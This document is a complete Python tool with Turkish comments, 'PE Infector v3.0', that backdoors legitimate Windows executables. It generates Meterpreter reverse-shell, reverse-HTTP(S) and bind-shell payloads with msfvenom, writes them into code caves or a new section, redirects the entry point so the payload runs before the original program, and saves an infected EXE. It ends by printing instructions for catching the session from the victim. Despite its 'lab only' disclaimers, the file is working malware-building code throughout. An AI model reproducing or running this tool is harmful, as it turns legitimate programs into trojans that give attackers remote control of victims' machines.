#!/usr/bin/env python3
"""
PE Infector v3.0 - Shellter Style Tool
=======================================
Meşru PE dosyalarına shellcode enjekte eder ve yeni EXE üretir.
Entegre payload üretimi - Shellter gibi!

Yazar: Uğur Ateş
Amaç: Eğitim ve araştırma (Lab ortamı için)

UYARI: Bu araç sadece eğitim amaçlıdır!
"""

import struct
import sys
import os
import subprocess
import tempfile
import argparse
from datetime import datetime

try:
    import pefile
except ImportError:
    print("[!] pefile kütüphanesi gerekli: pip install pefile")
    sys.exit(1)


# ============================================================================
# PAYLOAD TEMPLATES
# ============================================================================

PAYLOADS = {
    '1': {
        'name': 'Meterpreter Reverse TCP',
        'payload_x86': 'windows/meterpreter/reverse_tcp',
        'payload_x64': 'windows/x64/meterpreter/reverse_tcp',
        'description': 'Tam özellikli Meterpreter shell (staged)',
        'requires': ['LHOST', 'LPORT']
    },
    '2': {
        'name': 'Meterpreter Reverse HTTP',
        'payload_x86': 'windows/meterpreter/reverse_http',
        'payload_x64': 'windows/x64/meterpreter/reverse_http',
        'description': 'HTTP üzerinden Meterpreter (firewall bypass)',
        'requires': ['LHOST', 'LPORT']
    },
    '3': {
        'name': 'Meterpreter Reverse HTTPS',
        'payload_x86': 'windows/meterpreter/reverse_https',
        'payload_x64': 'windows/x64/meterpreter/reverse_https',
        'description': 'HTTPS üzerinden Meterpreter (şifreli)',
        'requires': ['LHOST', 'LPORT']
    },
    '4': {
        'name': 'Shell Reverse TCP',
        'payload_x86': 'windows/shell_reverse_tcp',
        'payload_x64': 'windows/x64/shell_reverse_tcp',
        'description': 'Basit cmd.exe reverse shell',
        'requires': ['LHOST', 'LPORT']
    },
    '5': {
        'name': 'Shell Bind TCP',
        'payload_x86': 'windows/shell_bind_tcp',
        'payload_x64': 'windows/x64/shell_bind_tcp',
        'description': 'Port dinleyen cmd.exe shell',
        'requires': ['LPORT']
    },
    '6': {
        'name': 'Meterpreter Stageless Reverse TCP',
        'payload_x86': 'windows/meterpreter_reverse_tcp',
        'payload_x64': 'windows/x64/meterpreter_reverse_tcp',
        'description': 'Tek parça Meterpreter (daha büyük, daha stabil)',
        'requires': ['LHOST', 'LPORT']
    },
    '7': {
        'name': 'Execute Command (calc.exe)',
        'payload_x86': 'windows/exec',
        'payload_x64': 'windows/x64/exec',
        'description': 'Test için - Hesap makinesi açar',
        'requires': [],
        'extra_args': 'CMD=calc.exe'
    }
}


class PayloadGenerator:
    """msfvenom ile payload üretimi"""
    
    @staticmethod
    def check_msfvenom():
        """msfvenom kurulu mu kontrol et"""
        try:
            result = subprocess.run(
                ['msfvenom', '--version'],
                capture_output=True,
                text=True,
                timeout=10
            )
            if result.returncode == 0:
                version = result.stdout.strip().split('\n')[0]
                return True, version
        except FileNotFoundError:
            pass
        except Exception as e:
            pass
        return False, None
    
    @staticmethod
    def generate(payload_name, lhost=None, lport=None, extra_args=None, is_64bit=True):
        """
        msfvenom ile shellcode üret
        
        Returns:
            bytes: Raw shellcode veya None
        """
        # Komut oluştur
        cmd = ['msfvenom', '-p', payload_name, '-f', 'raw']
        
        if lhost:
            cmd.extend([f'LHOST={lhost}'])
        if lport:
            cmd.extend([f'LPORT={lport}'])
        if extra_args:
            cmd.extend(extra_args.split())
        
        # Exitfunc ekle (thread olarak çık, process'i öldürme)
        cmd.append('EXITFUNC=thread')
        
        print(f"\n[*] Payload üretiliyor...")
        print(f"    Komut: {' '.join(cmd)}")
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=60
            )
            
            if result.returncode == 0:
                shellcode = result.stdout
                print(f"[+] Payload üretildi: {len(shellcode)} bytes")
                return shellcode
            else:
                print(f"[!] msfvenom hatası: {result.stderr.decode()}")
                return None
                
        except subprocess.TimeoutExpired:
            print("[!] msfvenom timeout!")
            return None
        except Exception as e:
            print(f"[!] Hata: {e}")
            return None


class PEInfector:
    """PE dosyalarına shellcode enjekte eden sınıf"""
    
    MIN_CAVE_SIZE = 64
    SECTION_ALIGNMENT = 0x1000
    FILE_ALIGNMENT = 0x200
    
    def __init__(self, target_path):
        self.target_path = target_path
        self.pe = None
        self.raw_data = None
        self.shellcode = None
        self.is_64bit = False
        self.original_entry_point = 0
        self.new_entry_point = 0
        self.image_base = 0
        self.injection_method = None
        
        self._load_pe()
    
    def _load_pe(self):
        """PE dosyasını yükle"""
        print(f"\n[*] PE dosyası yükleniyor: {self.target_path}")
        
        if not os.path.exists(self.target_path):
            raise FileNotFoundError(f"Dosya bulunamadı: {self.target_path}")
        
        with open(self.target_path, 'rb') as f:
            self.raw_data = bytearray(f.read())
        
        self.pe = pefile.PE(data=bytes(self.raw_data))
        
        if self.pe.FILE_HEADER.Machine == 0x8664:
            self.is_64bit = True
            print("[*] Mimari: x64 (64-bit)")
        elif self.pe.FILE_HEADER.Machine == 0x14c:
            self.is_64bit = False
            print("[*] Mimari: x86 (32-bit)")
        else:
            raise ValueError(f"Desteklenmeyen mimari: {hex(self.pe.FILE_HEADER.Machine)}")
        
        self.original_entry_point = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
        self.image_base = self.pe.OPTIONAL_HEADER.ImageBase
        
        print(f"[*] Image Base: {hex(self.image_base)}")
        print(f"[*] Original Entry Point (RVA): {hex(self.original_entry_point)}")
        print(f"[*] Section sayısı: {self.pe.FILE_HEADER.NumberOfSections}")
    
    def set_shellcode(self, shellcode):
        """Shellcode'u ayarla"""
        self.shellcode = shellcode
        print(f"[*] Shellcode yüklendi: {len(shellcode)} bytes")
    
    def load_shellcode_file(self, path):
        """Dosyadan shellcode yükle"""
        with open(path, 'rb') as f:
            self.shellcode = f.read()
        print(f"[*] Shellcode yüklendi: {len(self.shellcode)} bytes")
    
    def analyze_sections(self):
        """Section analizi"""
        print("\n" + "="*70)
        print("SECTION ANALİZİ")
        print("="*70)
        
        print(f"\n{'İsim':<10} {'VirtAddr':<12} {'VirtSize':<12} {'RawSize':<12} {'Flags'}")
        print("-"*60)
        
        for section in self.pe.sections:
            name = section.Name.decode('utf-8', errors='ignore').rstrip('\x00')
            flags = []
            chars = section.Characteristics
            if chars & 0x20000000: flags.append("X")
            if chars & 0x40000000: flags.append("R")
            if chars & 0x80000000: flags.append("W")
            
            print(f"{name:<10} {hex(section.VirtualAddress):<12} "
                  f"{hex(section.Misc_VirtualSize):<12} {hex(section.SizeOfRawData):<12} "
                  f"{''.join(flags)}")
    
    def find_code_caves(self):
        """Code cave bul"""
        caves = []
        required_size = len(self.shellcode) + 100 if self.shellcode else self.MIN_CAVE_SIZE
        
        for section in self.pe.sections:
            name = section.Name.decode('utf-8', errors='ignore').rstrip('\x00')
            
            is_executable = section.Characteristics & 0x20000000
            is_code = section.Characteristics & 0x00000020
            
            if not (is_executable or is_code):
                continue
            
            raw_size = section.SizeOfRawData
            virt_size = section.Misc_VirtualSize
            
            if raw_size > virt_size:
                padding_size = raw_size - virt_size
                
                if padding_size >= required_size:
                    cave_rva = section.VirtualAddress + virt_size
                    file_offset = section.PointerToRawData + virt_size
                    
                    caves.append({
                        'section': section,
                        'section_name': name,
                        'type': 'padding',
                        'rva': cave_rva,
                        'file_offset': file_offset,
                        'size': padding_size
                    })
        
        caves.sort(key=lambda x: x['size'], reverse=True)
        return caves
    
    def _align(self, value, alignment):
        return ((value + alignment - 1) // alignment) * alignment
    
    def add_section(self, name=".shell", size=0x1000):
        """Yeni section ekle"""
        print(f"\n[*] Yeni section ekleniyor: {name}")
        
        last_section = self.pe.sections[-1]
        section_alignment = self.pe.OPTIONAL_HEADER.SectionAlignment
        file_alignment = self.pe.OPTIONAL_HEADER.FileAlignment
        
        new_va = self._align(
            last_section.VirtualAddress + last_section.Misc_VirtualSize,
            section_alignment
        )
        
        new_raw_ptr = self._align(len(self.raw_data), file_alignment)
        aligned_size = self._align(size, file_alignment)
        
        # Section header
        section_header = bytearray(40)
        name_bytes = name.encode('utf-8')[:8].ljust(8, b'\x00')
        section_header[0:8] = name_bytes
        struct.pack_into('<I', section_header, 8, aligned_size)
        struct.pack_into('<I', section_header, 12, new_va)
        struct.pack_into('<I', section_header, 16, aligned_size)
        struct.pack_into('<I', section_header, 20, new_raw_ptr)
        characteristics = 0x60000020
        struct.pack_into('<I', section_header, 36, characteristics)
        
        # Header offset
        optional_header_offset = self.pe.DOS_HEADER.e_lfanew + 4 + 20
        section_headers_offset = optional_header_offset + self.pe.FILE_HEADER.SizeOfOptionalHeader
        num_sections = self.pe.FILE_HEADER.NumberOfSections
        new_header_offset = section_headers_offset + (num_sections * 40)
        
        # Yaz
        self.raw_data[new_header_offset:new_header_offset + 40] = section_header
        
        padding_needed = new_raw_ptr - len(self.raw_data)
        if padding_needed > 0:
            self.raw_data.extend(b'\x00' * padding_needed)
        self.raw_data.extend(b'\x00' * aligned_size)
        
        # Header güncelle
        num_sections_offset = self.pe.DOS_HEADER.e_lfanew + 4 + 2
        struct.pack_into('<H', self.raw_data, num_sections_offset, num_sections + 1)
        
        new_size_of_image = self._align(new_va + aligned_size, section_alignment)
        size_of_image_offset = optional_header_offset + (64 if self.is_64bit else 56)
        struct.pack_into('<I', self.raw_data, size_of_image_offset, new_size_of_image)
        
        self.pe = pefile.PE(data=bytes(self.raw_data))
        
        print(f"[+] Section eklendi: {name} @ {hex(new_va)}")
        
        return {
            'section_name': name,
            'rva': new_va,
            'file_offset': new_raw_ptr,
            'size': aligned_size,
            'type': 'new_section'
        }
    
    def _create_stub_x86(self, jmp_offset):
        """x86 stub"""
        stub_start = bytes([0x60, 0x9C])  # PUSHAD, PUSHFD
        jmp_bytes = struct.pack('<i', jmp_offset)
        stub_end = bytes([0x9D, 0x61, 0xE9]) + jmp_bytes  # POPFD, POPAD, JMP
        return stub_start, stub_end
    
    def _create_stub_x64(self, jmp_offset):
        """x64 stub"""
        stub_start = bytes([
            0x50, 0x51, 0x52, 0x53, 0x55, 0x56, 0x57,  # PUSH RAX-RDI
            0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,  # PUSH R8-R11
            0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,  # PUSH R12-R15
            0x9C,  # PUSHFQ
            0x48, 0x83, 0xEC, 0x28,  # SUB RSP, 0x28
        ])
        
        jmp_bytes = struct.pack('<i', jmp_offset)
        
        stub_end = bytes([
            0x48, 0x83, 0xC4, 0x28,  # ADD RSP, 0x28
            0x9D,  # POPFQ
            0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,  # POP R15-R12
            0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58,  # POP R11-R8
            0x5F, 0x5E, 0x5D, 0x5B, 0x5A, 0x59, 0x58,  # POP RDI-RAX
            0xE9,  # JMP
        ]) + jmp_bytes
        
        return stub_start, stub_end
    
    def inject(self, method='auto'):
        """Shellcode enjekte et"""
        if not self.shellcode:
            raise ValueError("Shellcode yüklenmemiş!")
        
        print("\n" + "="*70)
        print("ENJEKSİYON")
        print("="*70)
        
        cave = None
        required_size = len(self.shellcode) + 100
        
        if method in ['auto', 'cave']:
            caves = self.find_code_caves()
            for c in caves:
                if c['size'] >= required_size:
                    cave = c
                    self.injection_method = 'code_cave'
                    print(f"\n[+] Code cave bulundu: {c['section_name']}")
                    print(f"    RVA: {hex(c['rva'])}")
                    print(f"    Boyut: {c['size']} bytes")
                    break
        
        if cave is None and method in ['auto', 'section']:
            print("\n[*] Code cave bulunamadı, yeni section ekleniyor...")
            required_size = self._align(len(self.shellcode) + 100, self.FILE_ALIGNMENT)
            cave = self.add_section(name=".data1", size=required_size)
            self.injection_method = 'new_section'
        
        if cave is None:
            raise ValueError("Enjeksiyon için uygun alan bulunamadı!")
        
        shellcode_rva = cave['rva']
        shellcode_file_offset = cave['file_offset']
        
        # Stub oluştur
        if self.is_64bit:
            stub_start, stub_end = self._create_stub_x64(0)
        else:
            stub_start, stub_end = self._create_stub_x86(0)
        
        # JMP offset hesapla
        jmp_instruction_rva = shellcode_rva + len(stub_start) + len(self.shellcode) + (len(stub_end) - 4)
        jmp_offset = self.original_entry_point - (jmp_instruction_rva + 4)
        
        # Gerçek stub
        if self.is_64bit:
            stub_start, stub_end = self._create_stub_x64(jmp_offset)
        else:
            stub_start, stub_end = self._create_stub_x86(jmp_offset)
        
        payload = stub_start + self.shellcode + stub_end
        
        print(f"\n[*] Payload: {len(payload)} bytes")
        print(f"    Stub başlangıç: {len(stub_start)} bytes")
        print(f"    Shellcode: {len(self.shellcode)} bytes")
        print(f"    Stub bitiş: {len(stub_end)} bytes")
        
        # Yaz
        self.raw_data[shellcode_file_offset:shellcode_file_offset + len(payload)] = payload
        
        # Section executable yap
        if 'section' in cave and cave['section'] is not None:
            section = cave['section']
            original_chars = section.Characteristics
            new_chars = original_chars | 0x20000000 | 0x40000000
            
            if original_chars != new_chars:
                section_headers_offset = self.pe.DOS_HEADER.e_lfanew + 4 + 20 + self.pe.FILE_HEADER.SizeOfOptionalHeader
                for i, sec in enumerate(self.pe.sections):
                    if sec.VirtualAddress == section.VirtualAddress:
                        chars_offset = section_headers_offset + (i * 40) + 36
                        struct.pack_into('<I', self.raw_data, chars_offset, new_chars)
                        break
        
        # Entry point değiştir
        self.new_entry_point = shellcode_rva
        optional_header_offset = self.pe.DOS_HEADER.e_lfanew + 4 + 20
        ep_offset = optional_header_offset + 16
        struct.pack_into('<I', self.raw_data, ep_offset, self.new_entry_point)
        
        print(f"\n[*] Entry Point değiştirildi:")
        print(f"    Eski: {hex(self.original_entry_point)} → Yeni: {hex(self.new_entry_point)}")
        
        self.pe = pefile.PE(data=bytes(self.raw_data))
        print("\n[+] Enjeksiyon tamamlandı!")
    
    def save(self, output_path):
        """Kaydet"""
        with open(output_path, 'wb') as f:
            f.write(bytes(self.raw_data))
        
        print(f"\n[+] Kaydedildi: {output_path}")
        print(f"[+] Boyut: {os.path.getsize(output_path)} bytes")
        return output_path


def print_banner():
    """Banner"""
    banner = r"""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║   ██████╗ ███████╗    ██╗███╗   ██╗███████╗███████╗ ██████╗ ██████╗ 
    ║   ██╔══██╗██╔════╝    ██║████╗  ██║██╔════╝██╔════╝██╔════╝╚═██╔═╝║
    ║   ██████╔╝█████╗      ██║██╔██╗ ██║█████╗  █████╗  ██║       ██║  ║
    ║   ██╔═══╝ ██╔══╝      ██║██║╚██╗██║██╔══╝  ██╔══╝  ██║       ██║  ║
    ║   ██║     ███████╗    ██║██║ ╚████║██║     ███████╗╚██████╗  ██║  ║
    ║   ╚═╝     ╚══════╝    ╚═╝╚═╝  ╚═══╝╚═╝     ╚══════╝ ╚═════╝  ╚═╝  ║
    ║                                                                   ║
    ║        PE Infector v3.0 - Shellter Style Tool                     ║
    ║        Integrated Payload Generation | x86 & x64 Support          ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """
    print(banner)


def print_payload_menu():
    """Payload menüsü"""
    print("\n" + "="*60)
    print("PAYLOAD SEÇİMİ")
    print("="*60)
    print()
    
    for key, payload in PAYLOADS.items():
        print(f"  [{key}] {payload['name']}")
        print(f"      {payload['description']}")
        print()


def interactive_mode():
    """Shellter tarzı interaktif mod"""
    print_banner()
    
    # msfvenom kontrolü
    msfvenom_ok, msfvenom_ver = PayloadGenerator.check_msfvenom()
    
    if msfvenom_ok:
        print(f"[+] msfvenom bulundu: {msfvenom_ver}")
    else:
        print("[!] msfvenom bulunamadı!")
        print("    Metasploit Framework kurulu olmalı.")
        print("    Alternatif: Hazır shellcode dosyası kullanın (-s parametresi)")
        print()
        use_file = input("[?] Shellcode dosyasından devam etmek ister misiniz? (e/h): ").strip().lower()
        if use_file != 'e':
            return
    
    # ══════════════════════════════════════════════════════════════
    # ADIM 1: HEDEF DOSYA
    # ══════════════════════════════════════════════════════════════
    print("\n" + "="*60)
    print("ADIM 1: HEDEF PE DOSYASI")
    print("="*60)
    
    print("\n[?] PE Target (hedef dosya yolu):")
    target = input("    > ").strip()
    
    if not target:
        print("[!] Dosya yolu gerekli!")
        return
    
    if not os.path.exists(target):
        print(f"[!] Dosya bulunamadı: {target}")
        return
    
    # PE yükle
    try:
        infector = PEInfector(target)
    except Exception as e:
        print(f"[!] PE yükleme hatası: {e}")
        return
    
    infector.analyze_sections()
    
    # ══════════════════════════════════════════════════════════════
    # ADIM 2: PAYLOAD
    # ══════════════════════════════════════════════════════════════
    
    if msfvenom_ok:
        print_payload_menu()
        
        print("[?] Payload seçin (1-7) veya 'c' özel shellcode dosyası için:")
        choice = input("    > ").strip()
        
        if choice.lower() == 'c':
            # Dosyadan yükle
            print("\n[?] Shellcode dosyası (.bin):")
            sc_path = input("    > ").strip()
            if not os.path.exists(sc_path):
                print(f"[!] Dosya bulunamadı: {sc_path}")
                return
            infector.load_shellcode_file(sc_path)
        
        elif choice in PAYLOADS:
            payload_info = PAYLOADS[choice]
            
            # Mimari seç
            if infector.is_64bit:
                payload_name = payload_info['payload_x64']
            else:
                payload_name = payload_info['payload_x86']
            
            print(f"\n[*] Seçilen payload: {payload_info['name']}")
            print(f"[*] Mimari: {'x64' if infector.is_64bit else 'x86'}")
            print(f"[*] Payload: {payload_name}")
            
            # Parametreler
            lhost = None
            lport = None
            extra_args = payload_info.get('extra_args', None)
            
            if 'LHOST' in payload_info['requires']:
                print("\n[?] LHOST (Kali IP adresi):")
                lhost = input("    > ").strip()
                if not lhost:
                    print("[!] LHOST gerekli!")
                    return
            
            if 'LPORT' in payload_info['requires']:
                print("\n[?] LPORT (Dinlenecek port) [4444]:")
                lport = input("    > ").strip()
                if not lport:
                    lport = "4444"
            
            # Payload üret
            shellcode = PayloadGenerator.generate(
                payload_name,
                lhost=lhost,
                lport=lport,
                extra_args=extra_args,
                is_64bit=infector.is_64bit
            )
            
            if shellcode is None:
                print("[!] Payload üretimi başarısız!")
                return
            
            infector.set_shellcode(shellcode)
        else:
            print("[!] Geçersiz seçim!")
            return
    else:
        # msfvenom yok, dosyadan yükle
        print("\n[?] Shellcode dosyası (.bin):")
        sc_path = input("    > ").strip()
        if not os.path.exists(sc_path):
            print(f"[!] Dosya bulunamadı: {sc_path}")
            return
        infector.load_shellcode_file(sc_path)
    
    # ══════════════════════════════════════════════════════════════
    # ADIM 3: ENJEKSİYON
    # ══════════════════════════════════════════════════════════════
    
    print("\n" + "="*60)
    print("ADIM 3: ENJEKSİYON YÖNTEMİ")
    print("="*60)
    
    print("\n[?] Enjeksiyon yöntemi:")
    print("    [1] Auto (code cave veya yeni section)")
    print("    [2] Sadece code cave")
    print("    [3] Yeni section ekle")
    
    method_choice = input("\n    > ").strip()
    method_map = {'1': 'auto', '2': 'cave', '3': 'section'}
    method = method_map.get(method_choice, 'auto')
    
    try:
        infector.inject(method=method)
    except Exception as e:
        print(f"\n[!] Enjeksiyon hatası: {e}")
        import traceback
        traceback.print_exc()
        return
    
    # ══════════════════════════════════════════════════════════════
    # ADIM 4: KAYDET
    # ══════════════════════════════════════════════════════════════
    
    print("\n" + "="*60)
    print("ADIM 4: ÇIKTI")
    print("="*60)
    
    base, ext = os.path.splitext(target)
    default_output = f"{base}_infected{ext}"
    
    print(f"\n[?] Çıktı dosyası [{default_output}]:")
    output = input("    > ").strip()
    if not output:
        output = default_output
    
    try:
        infector.save(output)
    except Exception as e:
        print(f"[!] Kaydetme hatası: {e}")
        return
    
    # ══════════════════════════════════════════════════════════════
    # TAMAMLANDI
    # ══════════════════════════════════════════════════════════════
    
    print("\n" + "="*60)
    print("✅ ENJEKSİYON BAŞARILI!")
    print("="*60)
    
    print(f"""
    ┌─────────────────────────────────────────────────────────────┐
    │  Enfekte dosya: {output:<42} │
    │  Orijinal EP:   {hex(infector.original_entry_point):<42} │
    │  Yeni EP:       {hex(infector.new_entry_point):<42} │
    │  Yöntem:        {infector.injection_method:<42} │
    └─────────────────────────────────────────────────────────────┘
    """)
    
    if 'lhost' in dir() and lhost:
        print(f"""
    ┌─────────────────────────────────────────────────────────────┐
    │  SONRAKİ ADIMLAR:                                           │
    │                                                             │
    │  1. Kali'de listener başlat:                                │
    │     msfconsole -q                                           │
    │     use exploit/multi/handler                               │
    │     set PAYLOAD {payload_name:<40} │
    │     set LHOST {lhost:<46} │
    │     set LPORT {lport:<46} │
    │     run                                                     │
    │                                                             │
    │  2. Windows hedefte çalıştır:                               │
    │     {output:<55} │
    │                                                             │
    │  3. Session'ı al ve keyfini çıkar! 🎉                       │
    └─────────────────────────────────────────────────────────────┘
        """)
    
    print("\n[!] UYARI: Sadece lab ortamında kullanın!")


def main():
    """Ana fonksiyon"""
    parser = argparse.ArgumentParser(description="PE Infector v3.0")
    parser.add_argument('-t', '--target', help='Hedef PE dosyası')
    parser.add_argument('-s', '--shellcode', help='Shellcode dosyası')
    parser.add_argument('-o', '--output', help='Çıktı dosyası')
    parser.add_argument('-p', '--payload', help='Payload numarası (1-7)')
    parser.add_argument('--lhost', help='LHOST')
    parser.add_argument('--lport', help='LPORT', default='4444')
    parser.add_argument('--method', choices=['auto', 'cave', 'section'], default='auto')
    
    args = parser.parse_args()
    
    # Argüman yoksa interaktif mod
    if len(sys.argv) == 1:
        interactive_mode()
        return
    
    # Komut satırı modu
    if not args.target:
        parser.print_help()
        return
    
    print_banner()
    
    infector = PEInfector(args.target)
    infector.analyze_sections()
    
    # Shellcode
    if args.shellcode:
        infector.load_shellcode_file(args.shellcode)
    elif args.payload:
        payload_info = PAYLOADS.get(args.payload)
        if not payload_info:
            print(f"[!] Geçersiz payload: {args.payload}")
            return
        
        payload_name = payload_info['payload_x64'] if infector.is_64bit else payload_info['payload_x86']
        
        shellcode = PayloadGenerator.generate(
            payload_name,
            lhost=args.lhost,
            lport=args.lport,
            extra_args=payload_info.get('extra_args'),
            is_64bit=infector.is_64bit
        )
        
        if not shellcode:
            return
        
        infector.set_shellcode(shellcode)
    else:
        print("[!] Shellcode gerekli: -s veya -p")
        return
    
    infector.inject(method=args.method)
    
    output = args.output or f"{os.path.splitext(args.target)[0]}_infected.exe"
    infector.save(output)


if __name__ == "__main__":
    main()
